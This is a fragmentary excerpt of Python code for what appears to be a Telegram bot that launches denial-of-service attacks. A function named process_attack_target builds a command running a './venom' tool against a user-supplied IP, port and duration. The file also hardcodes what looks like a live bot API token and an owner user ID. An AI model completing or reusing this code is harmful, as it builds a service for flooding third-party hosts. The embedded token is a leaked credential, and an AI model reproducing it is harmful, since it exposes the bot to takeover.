...
# Bot configuration
API_TOKEN = '7656951007:AAF7UmQPOPwMRD6V1H_fedPT-3Gs19rUXdo'  # Replace with your bot token
OWNER_ID = 6698471973  # Replace with your Telegram user ID
...
def process_attack_target(message):
    ...
    command_line = f"./venom {ip} {port} {duration_seconds} 10"
    try:
